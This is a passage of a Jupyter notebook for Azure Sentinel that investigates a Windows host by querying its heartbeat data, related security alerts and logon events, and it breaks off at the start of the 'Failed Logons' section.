{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " # Windows Host Explorer\n",
    " &lt;details&gt;\n",
    "     <summary> <u>Details...</u></summary>\n",
    "\n",
    " **Notebook Version:** 1.0<br>\n",
    " **Python Version:** Python 3.6 (including Python 3.6 - AzureML)<br>\n",
    " **Required Packages**: kqlmagic, msticpy, pandas, numpy, matplotlib, bokeh, networkx, ipywidgets, ipython, scikit_learn, dnspython, ipwhois, folium, maxminddb_geolite2<br>\n",
    " **Platforms Supported**:\n",
    " - Azure Notebooks Free Compute\n",
    " - Azure Notebooks DSVM\n",
    " - OS Independent\n",
    "\n",
    " **Data Sources Required**:\n",
    " - Log Analytics - SecurityAlert, SecurityEvent (EventIDs 4688 and 4624/25), AzureNetworkAnalytics_CL, Heartbeat\n",
    " - (Optional) - VirusTotal, AlienVault OTX, IBM XForce, Open Page Rank, (all require accounts and API keys)\n",
    " &lt;/details&gt;\n",
    "\n",
    " Brings together a series of queries and visualizations to help you determine the security state of the Windows host or virtual machine that you are investigating.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "toc": true
   },
   "source": [
    "<h1>Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\"><ul class=\"toc-item\"><li><span><a href=\"#Windows-Host-Explorer\" data-toc-modified-id=\"Windows-Host-Explorer-1\"><span class=\"toc-item-num\">1&nbsp;&nbsp;</span>Windows Host Explorer</a></span><ul class=\"toc-item\"><li><span><a href=\"#Notebook-Initialization\" data-toc-modified-id=\"Notebook-Initialization-1.1\"><span class=\"toc-item-num\">1.1&nbsp;&nbsp;</span>Notebook Initialization</a></span></li><li><span><a href=\"#Get-WorkspaceId-and-Authenticate-to-Azure-Sentinel\" data-toc-modified-id=\"Get-WorkspaceId-and-Authenticate-to-Azure-Sentinel-1.2\"><span class=\"toc-item-num\">1.2&nbsp;&nbsp;</span>Get WorkspaceId and Authenticate to Azure Sentinel</a></span><ul class=\"toc-item\"><li><span><a href=\"#Authentication-and-Configuration-Problems\" data-toc-modified-id=\"Authentication-and-Configuration-Problems-1.2.1\"><span class=\"toc-item-num\">1.2.1&nbsp;&nbsp;</span>Authentication and Configuration Problems</a></span></li></ul></li></ul></li><li><span><a href=\"#Search-for-a-Host-name-and-query-host-properties\" data-toc-modified-id=\"Search-for-a-Host-name-and-query-host-properties-2\"><span class=\"toc-item-num\">2&nbsp;&nbsp;</span>Search for a Host name and query host properties</a></span></li><li><span><a href=\"#Related-Alerts\" data-toc-modified-id=\"Related-Alerts-3\"><span class=\"toc-item-num\">3&nbsp;&nbsp;</span>Related Alerts</a></span><ul class=\"toc-item\"><li><span><a href=\"#Browse-List-of-Related-Alerts\" data-toc-modified-id=\"Browse-List-of-Related-Alerts-3.1\"><span class=\"toc-item-num\">3.1&nbsp;&nbsp;</span>Browse List of Related Alerts</a></span></li></ul></li><li><span><a href=\"#Host-Logons\" data-toc-modified-id=\"Host-Logons-4\"><span class=\"toc-item-num\">4&nbsp;&nbsp;</span>Host Logons</a></span><ul class=\"toc-item\"><li><span><a href=\"#Successful-Logons---Timeline-and-LogonType-breakdown\" data-toc-modified-id=\"Successful-Logons---Timeline-and-LogonType-breakdown-4.1\"><span class=\"toc-item-num\">4.1&nbsp;&nbsp;</span>Successful Logons - Timeline and LogonType breakdown</a></span></li><li><span><a href=\"#Failed-Logons\" data-toc-modified-id=\"Failed-Logons-4.2\"><span class=\"toc-item-num\">4.2&nbsp;&nbsp;</span>Failed Logons</a></span><ul class=\"toc-item\"><li><span><a href=\"#Accounts-With-Failed-And-Successful-Logons\" data-toc-modified-id=\"Accounts-With-Failed-And-Successful-Logons-4.2.1\"><span class=\"toc-item-num\">4.2.1&nbsp;&nbsp;</span>Accounts With Failed And Successful Logons</a></span></li></ul></li></ul></li><li><span><a href=\"#Other-Security-Events\" data-toc-modified-id=\"Other-Security-Events-5\"><span class=\"toc-item-num\">5&nbsp;&nbsp;</span>Other Security Events</a></span><ul class=\"toc-item\"><li><span><a href=\"#Parse-Event-Data-for-Selected-Events\" data-toc-modified-id=\"Parse-Event-Data-for-Selected-Events-5.1\"><span class=\"toc-item-num\">5.1&nbsp;&nbsp;</span>Parse Event Data for Selected Events</a></span></li><li><span><a href=\"#Account-Change-Events---Timeline\" data-toc-modified-id=\"Account-Change-Events---Timeline-5.2\"><span class=\"toc-item-num\">5.2&nbsp;&nbsp;</span>Account Change Events - Timeline</a></span></li><li><span><a href=\"#Show-Details-of-Selected-Events\" data-toc-modified-id=\"Show-Details-of-Selected-Events-5.3\"><span class=\"toc-item-num\">5.3&nbsp;&nbsp;</span>Show Details of Selected Events</a></span></li></ul></li><li><span><a href=\"#Examine-Logon-Sessions\" data-toc-modified-id=\"Examine-Logon-Sessions-6\"><span class=\"toc-item-num\">6&nbsp;&nbsp;</span>Examine Logon Sessions</a></span><ul class=\"toc-item\"><li><span><a href=\"#Browse-logon-account-details\" data-toc-modified-id=\"Browse-logon-account-details-6.1\"><span class=\"toc-item-num\">6.1&nbsp;&nbsp;</span>Browse logon account details</a></span></li><li><span><a href=\"#View-distinct-host-logon-patterns\" data-toc-modified-id=\"View-distinct-host-logon-patterns-6.2\"><span class=\"toc-item-num\">6.2&nbsp;&nbsp;</span>View distinct host logon patterns</a></span></li><li><span><a href=\"#Analyze-Processes-Patterns-for-logon-sessions\" data-toc-modified-id=\"Analyze-Processes-Patterns-for-logon-sessions-6.3\"><span class=\"toc-item-num\">6.3&nbsp;&nbsp;</span>Analyze Processes Patterns for logon sessions</a></span><ul class=\"toc-item\"><li><span><a href=\"#Compute-the-relative-rarity-of-processes-in-each-session\" data-toc-modified-id=\"Compute-the-relative-rarity-of-processes-in-each-session-6.3.1\"><span class=\"toc-item-num\">6.3.1&nbsp;&nbsp;</span>Compute the relative rarity of processes in each session</a></span></li><li><span><a href=\"#Overview-of-session-timelines-for-sessions-with-higher-rarity-score\" data-toc-modified-id=\"Overview-of-session-timelines-for-sessions-with-higher-rarity-score-6.3.2\"><span class=\"toc-item-num\">6.3.2&nbsp;&nbsp;</span>Overview of session timelines for sessions with higher rarity score</a></span></li><li><span><a href=\"#View-the-processes-for-these-Sessions\" data-toc-modified-id=\"View-the-processes-for-these-Sessions-6.3.3\"><span class=\"toc-item-num\">6.3.3&nbsp;&nbsp;</span>View the processes for these Sessions</a></span></li></ul></li><li><span><a href=\"#Browse-All-Sessions-(Optional)\" data-toc-modified-id=\"Browse-All-Sessions-(Optional)-6.4\"><span class=\"toc-item-num\">6.4&nbsp;&nbsp;</span>Browse All Sessions (Optional)</a></span><ul class=\"toc-item\"><li><span><a href=\"#Step-1---Select-a-logon-ID-and-Type\" data-toc-modified-id=\"Step-1---Select-a-logon-ID-and-Type-6.4.1\"><span class=\"toc-item-num\">6.4.1&nbsp;&nbsp;</span>Step 1 - Select a logon ID and Type</a></span></li><li><span><a href=\"#Step-2---Pick-a-logon-session-to-view-its-processes\" data-toc-modified-id=\"Step-2---Pick-a-logon-session-to-view-its-processes-6.4.2\"><span class=\"toc-item-num\">6.4.2&nbsp;&nbsp;</span>Step 2 - Pick a logon session to view its processes</a></span></li></ul></li></ul></li><li><span><a href=\"#Check-for-IOCs-in-Commandline-for-selected-session\" data-toc-modified-id=\"Check-for-IOCs-in-Commandline-for-selected-session-7\"><span class=\"toc-item-num\">7&nbsp;&nbsp;</span>Check for IOCs in Commandline for selected session</a></span><ul class=\"toc-item\"><li><span><a href=\"#Extract-IoCs\" data-toc-modified-id=\"Extract-IoCs-7.1\"><span class=\"toc-item-num\">7.1&nbsp;&nbsp;</span>Extract IoCs</a></span></li><li><span><a href=\"#If-any-Base64-encoded-strings,-decode-and-search-for-IoCs-in-the-results.\" data-toc-modified-id=\"If-any-Base64-encoded-strings,-decode-and-search-for-IoCs-in-the-results.-7.2\"><span class=\"toc-item-num\">7.2&nbsp;&nbsp;</span>If any Base64 encoded strings, decode and search for IoCs in the results.</a></span></li><li><span><a href=\"#Threat-Intel-Lookup\" data-toc-modified-id=\"Threat-Intel-Lookup-7.3\"><span class=\"toc-item-num\">7.3&nbsp;&nbsp;</span>Threat Intel Lookup</a></span></li></ul></li><li><span><a href=\"#Network-Check-Communications-with-Other-Hosts\" data-toc-modified-id=\"Network-Check-Communications-with-Other-Hosts-8\"><span class=\"toc-item-num\">8&nbsp;&nbsp;</span>Network Check Communications with Other Hosts</a></span><ul class=\"toc-item\"><li><span><a href=\"#Query-Flows-by-Host-IP-Addresses\" data-toc-modified-id=\"Query-Flows-by-Host-IP-Addresses-8.1\"><span class=\"toc-item-num\">8.1&nbsp;&nbsp;</span>Query Flows by Host IP Addresses</a></span></li><li><span><a href=\"#Flow-Summary\" data-toc-modified-id=\"Flow-Summary-8.2\"><span class=\"toc-item-num\">8.2&nbsp;&nbsp;</span>Flow Summary</a></span></li><li><span><a href=\"#Choose-ASNs/IPs-to-Check-for-Threat-Intel-Reports\" data-toc-modified-id=\"Choose-ASNs/IPs-to-Check-for-Threat-Intel-Reports-8.3\"><span class=\"toc-item-num\">8.3&nbsp;&nbsp;</span>Choose ASNs/IPs to Check for Threat Intel Reports</a></span></li><li><span><a href=\"#GeoIP-Map-of-External-IPs\" data-toc-modified-id=\"GeoIP-Map-of-External-IPs-8.4\"><span class=\"toc-item-num\">8.4&nbsp;&nbsp;</span>GeoIP Map of External IPs</a></span></li></ul></li><li><span><a href=\"#Appendices\" data-toc-modified-id=\"Appendices-9\"><span class=\"toc-item-num\">9&nbsp;&nbsp;</span>Appendices</a></span><ul class=\"toc-item\"><li><span><a href=\"#Available-DataFrames\" data-toc-modified-id=\"Available-DataFrames-9.1\"><span class=\"toc-item-num\">9.1&nbsp;&nbsp;</span>Available DataFrames</a></span></li><li><span><a href=\"#Saving-Data-to-Excel\" data-toc-modified-id=\"Saving-Data-to-Excel-9.2\"><span class=\"toc-item-num\">9.2&nbsp;&nbsp;</span>Saving Data to Excel</a></span></li><li><span><a href=\"#Configuration\" data-toc-modified-id=\"Configuration-9.3\"><span class=\"toc-item-num\">9.3&nbsp;&nbsp;</span>Configuration</a></span><ul class=\"toc-item\"><li><span><a href=\"#msticpyconfig.yaml-configuration-File\" data-toc-modified-id=\"msticpyconfig.yaml-configuration-File-9.3.1\"><span class=\"toc-item-num\">9.3.1&nbsp;&nbsp;</span><code>msticpyconfig.yaml</code> configuration File</a></span></li></ul></li></ul></li></ul></div>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebook Initialization\n",
    "This cell:\n",
    "\n",
    "- Checks for the correct Python version\n",
    "- Checks versions and optionally installs required packages\n",
    "- Imports the required packages into the notebook\n",
    "- Sets a number of configuration options.\n",
    "\n",
    "This should complete without errors. If you encounter errors or warnings look at the following two notebooks:\n",
    "- [TroubleShootingNotebooks](https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/TroubleShootingNotebooks.ipynb)\n",
    "- [ConfiguringNotebookEnvironment](https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/ConfiguringNotebookEnvironment.ipynb)\n",
    "\n",
    "You may also need to do some additional configuration to successfully use functions such as Threat Intelligence service lookup and Geo IP lookup. See the <a href=\"#Configuration\">Configuration</a> section at the end of the notebook and the [ConfiguringNotebookEnvironment](https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/ConfiguringNotebookEnvironment.ipynb).\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:27:18.623464Z",
     "start_time": "2020-05-15T23:27:15.156160Z"
    }
   },
   "outputs": [],
   "source": [
    "from pathlib import Path\n",
    "import os\n",
    "import sys\n",
    "import warnings\n",
    "from IPython.display import display, HTML, Markdown\n",
    "\n",
    "REQ_PYTHON_VER=(3, 6)\n",
    "REQ_MSTICPY_VER=(0, 5, 0)\n",
    "\n",
    "display(HTML(\"<h3>Starting Notebook setup...</h3>\"))\n",
    "if Path(\"./utils/nb_check.py\").is_file():\n",
    "    from utils.nb_check import check_python_ver, check_mp_ver\n",
    "\n",
    "    check_python_ver(min_py_ver=REQ_PYTHON_VER)\n",
    "    try:\n",
    "        check_mp_ver(min_msticpy_ver=REQ_MSTICPY_VER)\n",
    "    except ImportError:\n",
    "        !pip install --user --upgrade msticpy\n",
    "        if \"msticpy\" in sys.modules:\n",
    "            importlib.reload(msticpy)\n",
    "        else:\n",
    "            import msticpy\n",
    "        check_mp_ver(MSTICPY_REQ_VERSION)\n",
    "            \n",
    "from msticpy.nbtools import nbinit\n",
    "nbinit.init_notebook(\n",
    "    namespace=globals(),\n",
    "    extra_imports=[\"ipwhois, IPWhois\"]\n",
    ");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Get WorkspaceId and Authenticate to Azure Sentinel\n",
    " &lt;details&gt;\n",
    "     <summary><u>Details...</u></summary>\n",
    " If you are using user/device authentication, run the following cell.\n",
    " - Click the 'Copy code to clipboard and authenticate' button.\n",
    " - This will pop up an Azure Active Directory authentication dialog (in a new tab or browser window). The device code will have been copied to the clipboard.\n",
    " - Select the text box and paste (Ctrl-V/Cmd-V) the copied value.\n",
    " - You should then be redirected to a user authentication page where you should authenticate with a user account that has permission to query your Log Analytics workspace.\n",
    "\n",
    " Use the following syntax if you are authenticating using an Azure Active Directory AppId and Secret:\n",
    " ```\n",
    " %kql loganalytics://tenant(aad_tenant).workspace(WORKSPACE_ID).clientid(client_id).clientsecret(client_secret)\n",
    " ```\n",
    " instead of\n",
    " ```\n",
    " %kql loganalytics://code().workspace(WORKSPACE_ID)\n",
    " ```\n",
    "\n",
    " Note: you may occasionally see a JavaScript error displayed at the end of the authentication - you can safely ignore this.<br>\n",
    " On successful authentication you should see a ```popup schema``` button.\n",
    " To find your Workspace Id go to [Log Analytics](https://ms.portal.azure.com/#blade/HubsExtension/Resources/resourceType/Microsoft.OperationalInsights%2Fworkspaces). Look at the workspace properties to find the ID.\n",
    " &lt;/details&gt;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:27:22.847608Z",
     "start_time": "2020-05-15T23:27:22.839609Z"
    }
   },
   "outputs": [],
   "source": [
    "#See if we have an Azure Sentinel Workspace defined in our config file, if not let the user specify Workspace and Tenant IDs\n",
    "from msticpy.nbtools.wsconfig import WorkspaceConfig\n",
    "# WorkspaceConfig.list_workspaces()\n",
    "# ws_config = WorkspaceConfig(workspace=\"My_Workspace_Name\")\n",
    "# calling WorkspaceConfig with no parameters will load the default workspace from msticpyconfig.yaml\n",
    "# or fall back on a config.json file.\n",
    "ws_config = WorkspaceConfig()\n",
    "try:\n",
    "    ws_id = ws_config['workspace_id']\n",
    "    ten_id = ws_config['tenant_id']\n",
    "    config = True\n",
    "    md(\"Workspace details collected from config file\")\n",
    "except KeyError:\n",
    "    md(('Please go to your Log Analytics workspace, copy the workspace ID'\n",
    "                 ' and/or tenant Id and paste here to enable connection to the workspace and querying of it..<br> '))\n",
    "    ws_id_wgt = nbwidgets.GetEnvironmentKey(env_var='WORKSPACE_ID',\n",
    "                                        prompt='Please enter your Log Analytics Workspace Id:', auto_display=True)\n",
    "    ten_id_wgt = nbwidgets.GetEnvironmentKey(env_var='TENANT_ID',\n",
    "                                         prompt='Please enter your Log Analytics Tenant Id:', auto_display=True)\n",
    "    config = False\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:28:39.796803Z",
     "start_time": "2020-05-15T23:27:27.080209Z"
    }
   },
   "outputs": [],
   "source": [
    "if config is False:\n",
    "    ws_id = ws_id_wgt.value\n",
    "    ten_id = ten_id_wgt.value\n",
    "# Establish a query provider for Azure Sentinel and connect to it\n",
    "qry_prov = QueryProvider('LogAnalytics')\n",
    "qry_prov.connect(connection_str=ws_config.code_connect_str)\n",
    "table_index = qry_prov.schema_tables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-31T23:37:18.211230Z",
     "start_time": "2019-10-31T23:37:18.204259Z"
    }
   },
   "source": [
    "### Authentication and Configuration Problems\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "    <summary>Click for details about configuring your authentication parameters</summary>\n",
    "    \n",
    "    \n",
    "The notebook is expecting your Azure Sentinel Tenant ID and Workspace ID to be configured in one of the following places:\n",
    "- `config.json` in the current folder\n",
    "- `msticpyconfig.yaml` in the current folder or location specified by `MSTICPYCONFIG` environment variable.\n",
    "    \n",
    "For help with setting up your `config.json` file (if this hasn't been done automatically) see the [`ConfiguringNotebookEnvironment`](https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/ConfiguringNotebookEnvironment.ipynb) notebook in the root folder of your Azure-Sentinel-Notebooks project. This shows you how to obtain your Workspace and Subscription IDs from the Azure Sentinel Portal. You can use the SubscriptionID to find your Tenant ID). To view the current `config.json` run the following in a code cell.\n",
    "\n",
    "```%pfile config.json```\n",
    "\n",
    "For help with setting up your `msticpyconfig.yaml` see the [Setup](#Setup) section at the end of this notebook and the [ConfigureNotebookEnvironment notebook](https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/ConfiguringNotebookEnvironment.ipynb)\n",
    "</details>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[Contents](#Contents)\n",
    " # Search for a Host name and query host properties"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:28:41.610484Z",
     "start_time": "2020-05-15T23:28:41.598485Z"
    }
   },
   "outputs": [],
   "source": [
    "host_text = widgets.Text(\n",
    "    description=\"Enter the Host name to search for:\", **WIDGET_DEFAULTS\n",
    ")\n",
    "display(host_text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:28:46.198826Z",
     "start_time": "2020-05-15T23:28:46.144827Z"
    }
   },
   "outputs": [],
   "source": [
    "query_times = nbwidgets.QueryTime(units=\"day\", max_before=20, before=5, max_after=1)\n",
    "query_times.display()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:28:58.158859Z",
     "start_time": "2020-05-15T23:28:55.922817Z"
    }
   },
   "outputs": [],
   "source": [
    "# Get single event - try process creation\n",
    "if \"SecurityEvent\" not in table_index:\n",
    "    raise ValueError(\"No Windows event log data available in the workspace\")\n",
    "host_name = None\n",
    "matching_hosts_df = qry_prov.WindowsSecurity.list_host_processes(\n",
    "    query_times, host_name=host_text.value.strip(), add_query_items=\"| distinct Computer\"\n",
    ")\n",
    "if len(matching_hosts_df) > 1:\n",
    "    print(f\"Multiple matches for '{host_text.value}'. Please select a host from the list.\")\n",
    "    choose_host = nbwidgets.SelectString(\n",
    "        item_list=list(matching_hosts_df[\"Computer\"].values),\n",
    "        description=\"Select the host.\",\n",
    "        auto_display=True,\n",
    "    )\n",
    "elif not matching_hosts_df.empty:\n",
    "    host_name = matching_hosts_df[\"Computer\"].iloc[0]\n",
    "    print(f\"Unique host found: {host_name}\")\n",
    "else:\n",
    "    print(f\"Host not found: {host_text.value}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:12.506439Z",
     "start_time": "2020-05-15T23:29:01.493356Z"
    }
   },
   "outputs": [],
   "source": [
    "if not host_name:\n",
    "    host_name = choose_host.value\n",
    "\n",
    "host_entity = None\n",
    "if not matching_hosts_df.empty:\n",
    "    host_entity = entities.Host(src_event=matching_hosts_df[matching_hosts_df[\"Computer\"] == host_name].iloc[0])\n",
    "if not host_entity:\n",
    "    raise LookupError(f\"Could not find Windows events the name {host_name}\")\n",
    "\n",
    "def populate_heartbeat_details(host_hb_df, host_entity=None):\n",
    "    if not host_hb_df.empty:\n",
    "        host_hb = host_hb_df.iloc[0]\n",
    "        if not host_entity:\n",
    "            host_entity = entities.Host(host_hb[\"Computer\"])\n",
    "        host_entity.SourceComputerId = host_hb[\"SourceComputerId\"]\n",
    "        host_entity.OSType = host_hb[\"OSType\"]\n",
    "        host_entity.OSMajorVersion = host_hb[\"OSMajorVersion\"]\n",
    "        host_entity.OSMinorVersion = host_hb[\"OSMinorVersion\"]\n",
    "        host_entity.ComputerEnvironment = host_hb[\"ComputerEnvironment\"]\n",
    "        host_entity.ResourceId = host_hb[\"ResourceId\"]\n",
    "        host_entity.OmsSolutions = [\n",
    "            sol.strip() for sol in host_hb[\"Solutions\"].split(\",\")\n",
    "        ]\n",
    "        host_entity.VMUUID = host_hb[\"VMUUID\"]\n",
    "\n",
    "        ip_entity = entities.IpAddress()\n",
    "        ip_entity.Address = host_hb[\"ComputerIP\"]\n",
    "        geoloc_entity = entities.GeoLocation()\n",
    "        geoloc_entity.CountryName = host_hb[\"RemoteIPCountry\"]\n",
    "        geoloc_entity.Longitude = host_hb[\"RemoteIPLongitude\"]\n",
    "        geoloc_entity.Latitude = host_hb[\"RemoteIPLatitude\"]\n",
    "        ip_entity.Location = geoloc_entity\n",
    "        host_entity.IPAddress = ip_entity  # TODO change to graph edge\n",
    "    return host_entity\n",
    "\n",
    "def convert_to_ip_entities(ip_str):\n",
    "    iplocation = GeoLiteLookup()\n",
    "    ip_entities = []\n",
    "    if ip_str:\n",
    "        if \",\" in ip_str:\n",
    "            addrs = ip_str.split(\",\")\n",
    "        elif \" \" in ip_str:\n",
    "            addrs = ip_str.split(\" \")\n",
    "        else:\n",
    "            addrs = [ip_str]\n",
    "        for addr in addrs:\n",
    "            ip_entity = entities.IpAddress()\n",
    "            ip_entity.Address = addr.strip()\n",
    "            iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "            ip_entities.append(ip_entity)\n",
    "    return ip_entities\n",
    "\n",
    "# Add this information to our inv_host_entity\n",
    "def populate_host_aznet_ips(az_net_df, host_entity):\n",
    "    retrieved_address = []\n",
    "    if len(az_net_df) == 1:\n",
    "        host_entity.private_ips = convert_to_ip_entities(\n",
    "            az_net_df[\"PrivateIPAddresses\"].iloc[0]\n",
    "        )\n",
    "        host_entity.public_ips = convert_to_ip_entities(\n",
    "            az_net_df[\"PublicIPAddresses\"].iloc[0]\n",
    "        )\n",
    "        retrieved_address = [ip.Address for ip in host_entity.public_ips]\n",
    "    else:\n",
    "        if \"private_ips\" not in host_entity:\n",
    "            host_entity.private_ips = []\n",
    "        if \"public_ips\" not in host_entity:\n",
    "            host_entity.public_ips = []\n",
    "\n",
    "\n",
    "iplocation = GeoLiteLookup()\n",
    "\n",
    "# Try to get an OMS Heartbeat for this computer\n",
    "if \"Heartbeat\" in table_index:\n",
    "    print(f\"Looking for {host_name} in OMS Heartbeat data...\")\n",
    "    host_hb_df = qry_prov.Network.get_heartbeat_for_host(host_name=host_name)\n",
    "    host_entity = populate_heartbeat_details(host_hb_df, host_entity)\n",
    "\n",
    "if \"AzureNetworkAnalytics_CL\" in table_index:\n",
    "    print(f\"Looking for {host_name} IP addresses in network flows...\")\n",
    "    az_net_df = qry_prov.Network.get_ips_for_host(host_name=host_name)\n",
    "    populate_host_aznet_ips(az_net_df, host_entity)\n",
    "\n",
    "md(\"Host Details\", \"bold\")\n",
    "print(host_entity)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[Contents](#Contents)\n",
    " # Related Alerts\n",
    " Look for any related alerts around this time."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:12.712441Z",
     "start_time": "2020-05-15T23:29:12.667444Z"
    }
   },
   "outputs": [],
   "source": [
    "ra_query_times = nbwidgets.QueryTime(\n",
    "    units=\"day\",\n",
    "    origin_time=query_times.origin_time,\n",
    "    max_before=28,\n",
    "    max_after=5,\n",
    "    before=5,\n",
    "    auto_display=True,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:15.961693Z",
     "start_time": "2020-05-15T23:29:14.578094Z"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "related_alerts = qry_prov.SecurityAlert.list_related_alerts(\n",
    "    ra_query_times, host_name=host_entity.HostName\n",
    ")\n",
    "\n",
    "def print_related_alerts(alertDict, entityType, entityName):\n",
    "    if len(alertDict) > 0:\n",
    "        display(\n",
    "            Markdown(\n",
    "                f\"### Found {len(alertDict)} different alert types related to this {entityType} (`{entityName}`)\"\n",
    "            )\n",
    "        )\n",
    "        for (k, v) in alertDict.items():\n",
    "            print(f\"- {k}, # Alerts: {v}\")\n",
    "    else:\n",
    "        print(f\"No alerts for {entityType} entity `{entityName}`\")\n",
    "\n",
    "\n",
    "if isinstance(related_alerts, pd.DataFrame) and not related_alerts.empty:\n",
    "    host_alert_items = (\n",
    "        related_alerts[[\"AlertName\", \"TimeGenerated\"]]\n",
    "        .groupby(\"AlertName\")\n",
    "        .TimeGenerated.agg(\"count\")\n",
    "        .to_dict()\n",
    "    )\n",
    "    print_related_alerts(host_alert_items, \"host\", host_entity.HostName)\n",
    "    if len(host_alert_items) > 1:\n",
    "        nbdisplay.display_timeline(\n",
    "            data=related_alerts, title=\"Alerts\", source_columns=[\"AlertName\"], height=200\n",
    "        )\n",
    "else:\n",
    "    display(Markdown(\"No related alerts found.\"))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Browse List of Related Alerts\n",
    " Select an Alert to view details"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:19.615661Z",
     "start_time": "2020-05-15T23:29:19.546661Z"
    }
   },
   "outputs": [],
   "source": [
    "def disp_full_alert(alert):\n",
    "    global related_alert\n",
    "    related_alert = SecurityAlert(alert)\n",
    "    nbdisplay.display_alert(related_alert, show_entities=True)\n",
    "\n",
    "recenter_wgt = widgets.Checkbox(\n",
    "    value=True,\n",
    "    description='Center subsequent query times round selected Alert?',\n",
    "    disabled=False,\n",
    "    **WIDGET_DEFAULTS\n",
    ")\n",
    "if related_alerts is not None and not related_alerts.empty:\n",
    "    related_alerts[\"CompromisedEntity\"] = related_alerts[\"Computer\"]\n",
    "    display(Markdown(\"### Click on alert to view details.\"))\n",
    "    display(recenter_wgt)\n",
    "    rel_alert_select = nbwidgets.AlertSelector(\n",
    "        alerts=related_alerts,\n",
    "        action=disp_full_alert,\n",
    "    )\n",
    "    rel_alert_select.display()\n",
    "    \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "[Contents](#toc)\n",
    " # Host Logons\n",
    " This section looks at successful and failed logons on the host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:25.409590Z",
     "start_time": "2020-05-15T23:29:25.359585Z"
    }
   },
   "outputs": [],
   "source": [
    "# set the origin time to the time of our alert\n",
    "origin_time = (related_alert.TimeGenerated \n",
    "               if recenter_wgt.value \n",
    "               else query_times.origin_time)\n",
    "logon_query_times = nbwidgets.QueryTime(\n",
    "    units=\"day\",\n",
    "    origin_time=origin_time,\n",
    "    before=5,\n",
    "    after=1,\n",
    "    max_before=20,\n",
    "    max_after=20,\n",
    ")\n",
    "logon_query_times.display()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Successful Logons - Timeline and LogonType breakdown"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:29:29.150066Z",
     "start_time": "2020-05-15T23:29:27.337759Z"
    }
   },
   "outputs": [],
   "source": [
    "host_logons = qry_prov.WindowsSecurity.list_host_logons(\n",
    "    logon_query_times, host_name=host_entity.HostName\n",
    ")\n",
    "\n",
    "if host_logons is not None and not host_logons.empty:\n",
    "    display(Markdown(\"### Logon timeline.\"))\n",
    "    tooltip_cols = [\n",
    "        \"TargetUserName\",\n",
    "        \"TargetDomainName\",\n",
    "        \"SubjectUserName\",\n",
    "        \"SubjectDomainName\",\n",
    "        \"LogonType\",\n",
    "        \"IpAddress\",\n",
    "    ]\n",
    "    nbdisplay.display_timeline(\n",
    "        data=host_logons,\n",
    "        group_by=\"TargetUserName\",\n",
    "        source_columns=tooltip_cols,\n",
    "        legend=\"right\", yaxis=True\n",
    "    )\n",
    "\n",
    "    display(Markdown(\"### Counts of logon events by logon type.\"))\n",
    "    display(Markdown(\"Min counts for each logon type highlighted.\"))\n",
    "    logon_by_type = (\n",
    "        host_logons[[\"Account\", \"LogonType\", \"EventID\"]]\n",
    "        .astype({'LogonType': 'int32'})\n",
    "        .merge(right=pd.Series(data=nbdisplay._WIN_LOGON_TYPE_MAP, name=\"LogonTypeDesc\"),\n",
    "               left_on=\"LogonType\", right_index=True)\n",
    "        .drop(columns=\"LogonType\")\n",
    "        .groupby([\"Account\", \"LogonTypeDesc\"])\n",
    "        .count()\n",
    "        .unstack()\n",
    "        .rename(columns={\"EventID\": \"LogonCount\"})\n",
    "        .fillna(0)\n",
    "        .style\n",
    "        .background_gradient(cmap=\"viridis\", low=0.5, high=0)\n",
    "        .format(\"{0:0>3.0f}\")\n",
    "    )\n",
    "    display(logon_by_type)\n",
    "else:\n",
    "    display(Markdown(\"No logon events found for host.\"))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " <a></a>[Contents](#toc)\n",
    " ## Failed Logons"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
